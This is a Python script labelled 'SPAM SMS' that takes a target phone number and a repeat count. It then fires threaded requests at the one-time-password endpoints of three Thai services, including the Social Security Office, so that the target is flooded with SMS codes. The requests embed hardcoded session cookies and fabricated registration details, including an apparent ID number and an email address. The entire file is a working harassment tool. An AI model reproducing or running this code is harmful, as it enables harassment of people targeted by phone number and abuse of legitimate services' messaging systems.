import requests,json
import random
import os
import time
import threading
from requests import get
from re import search
from requests import Session
from threading import Thread
import colorama


banner='''
  \33[33m 
  \33[33m   ███████╗██████╗  █████╗ ███╗   ███╗   ███████╗███╗   ███╗███████╗
  \33[33m   ██╔════╝██╔══██╗██╔══██╗████╗ ████║   ██╔════╝████╗ ████║██╔════╝
  \33[33m   ███████╗██████╔╝███████║██╔████╔██║   ███████╗██╔████╔██║███████╗
  \33[33m   ╚════██║██╔═══╝ ██╔══██║██║╚██╔╝██║   ╚════██║██║╚██╔╝██║╚════██║
  \33[33m   ███████║██║     ██║  ██║██║ ╚═╝ ██║   ███████║██║ ╚═╝ ██║███████║
  \33[33m   ╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝   ╚══════╝╚═╝     ╚═╝╚══════╝     \33[91m  V.1.0  \33[33m
  \33[95m
  \33[95m
  \33[95m[\33[93m โค้ด BY \33[95m] \33[93m FB : SAKOL THANEERAT
'''
def hee():
    print(banner)

hee()
phone = input("PHONE : ")
NUM = int(input("NUM : "))

def api1():
    requests.post("https://the1web-api.the1.co.th/api/t1p/regis/requestOTP", json={"on":{"value":phone,"country":"66"},"type":"mobile"})
    
def api2():
        session = Session() #AISPlay
        print(session.post("https://srfng.ais.co.th/login/sendOneTimePW", 
            data=f"msisdn=66{phone[1:]}&serviceId=AISPlay&accountType=all&otpChannel=sms",
            headers={"User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; DUB-LX2 Build/HUAWEIDUB-LX2; wv) "
                "AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.127 Mobile Safari/537.36",
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "authorization": f'''Bearer {search("""<input type="hidden" id='token' value="(.*)">""", session.get(
                "https://srfng.ais.co.th/Lt6YyRR2Vvz%2B%2F6MNG9xQvVTU0rmMQ5snCwKRaK6rpTruhM%2BDAzuhRQ%3D%3D?redirect_uri=https%3A%2F%2Faisplay.ais.co.th%2Fportal%2Fcallback%2Ffungus%2Fany&httpGenerate=generated",
            headers={"User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; DUB-LX2 Build/HUAWEIDUB-LX2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.127 Mobile Safari/537.36"}).text).group(1)}'''}))
        
def api3():
    requests.post('https://www.sso.go.th/wpr/MEM/terminal/ajax_send_otp',headers = {"User-Agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","X-Requested-With": "XMLHttpRequest","Cookie": "sso_local_storeci_sessions=KHj9a18RowgHYWbh71T2%2FDFAcuC2%2FQaJkguD3MQ1eh%2FlwrUXvpAjJgrm6QKAja4oe7rglht%2BzO6oqblJ4EMJF4pqnY%2BGtR%2F0RzIFGN0Suh1DJVRCMPpP8QtZsF5yDyw6ibCMf2HXs95LvAMi7KUkIeaWkSahmh5f%2F3%2FqcOQ2OW5yakrMGA1mJ5upBZiUdEYNmxUAljcqrg7P3L%2BGAXxxC2u1bO09Oz4qf4ZV9ShO0gz5p5CbkE7VxIq1KUrEavn9Y%2BarQmsh1qIIc51uvCev1U1uyXfC%2F9U7uRl7x%2FVYZYT2pkLd3Q7qnZoSNBL8y9wge8Lt7grySdVLFhw9HB68dTSiOm1K04QhdrprI7EsTLWDHTgYmgyTQDuz63YjHsH5MUVanlfBISU1WXmRTXMKbUjlcl0LPPYUR9KWzrVL7sXcrCX%2FfUwLJIU%2F7MTtDYUx39y1CAREM%2F8dw7AEjcJAOA%3D%3D684b65b9b9dc33a3380c5b121b6c2b3ecb6f1bec; PHPSESSID=1s2rdo0664qpg4oteil3hhn3v2; TS01ac2b25=01584aa399fbfcc6474d383fdc1405e05eaa529fa33e596e5189664eb7dfefe57b927d8801ad40fba49f0adec4ce717dd5eabf08d7080e2b85f34368a92a47e71ef07861a287c40da15c0688649509d7f97eb2c293; _ga=GA1.3.1824294570.1636876684; _gid=GA1.3.1832635291.1636876684"},data=f"dCard=1358231116147&Mobile={phone}&password=098098Az&repassword=098098Az&perPrefix=Mr.&cn=Dhdhhs&sn=Vssbsh&perBirthday=5&perBirthmonth=5&perBirthyear=2545&Email=nickytom5879%40gmail.com&otp_type=OTP&otpvalue=&messageId=REGISTER")
    
    

for x in range(NUM):
    threading.Thread(target=api1).start()
    print ("ez api1")
    threading.Thread(target=api2).start()
    print ("ez api2")
    threading.Thread(target=api3).start()
    print ("ez api3")
